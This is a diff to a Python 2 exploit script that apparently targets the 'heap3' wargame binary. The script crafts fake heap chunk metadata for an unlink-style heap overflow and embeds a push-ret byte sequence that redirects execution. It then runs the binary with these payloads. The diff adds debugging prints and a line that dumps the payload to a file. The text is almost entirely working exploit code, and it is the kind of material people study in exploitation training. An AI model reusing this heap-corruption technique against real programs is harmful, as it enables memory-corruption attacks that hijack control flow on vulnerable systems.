@@ -11,6 +11,7 @@ SC = 0x804c008 + 8
 hpc = HeapPayloadCrafter(0x0804b128, 0x804c008 + 8, post_length=32, pre_length=32, pre_preset={31:"a"})
 #hpc = HeapPayloadCrafter(0x0804b128, 0x804c008 + 8, post_length=32, pre_length=32)
 prev, metadata, post = hpc.generate_payload()
+
 PREV_SIZE_C, SIZE_C = metadata
 
 arg1 = "A" * 8 + "\x68\x64\x88\x04\x08\xC3" + "AAAA"
@@ -26,6 +27,7 @@ arg1 = "A" * 8 + "\x68\x64\x88\x04\x08\xC3" + "AAAA"
 #arg3 = CR_PREV_SIZE + CR_SIZE + FD + BK + "A"*100
 
 arg2 = ''.join(prev) + ''.join([pack(i) for i in metadata])
+print len(arg2)
 arg3 = ''.join(post)
 
 print
@@ -40,6 +42,8 @@ print "prev          : %s" % repr(prev)
 print
 print "post          : %s" % repr(post)
 print
+
+open("dump", "w").write(arg1 + " " + arg2 + " " + arg3)
 
 p = shell.run(["/home/user/heap3", arg1, arg2, arg3])
 print p.recvline()
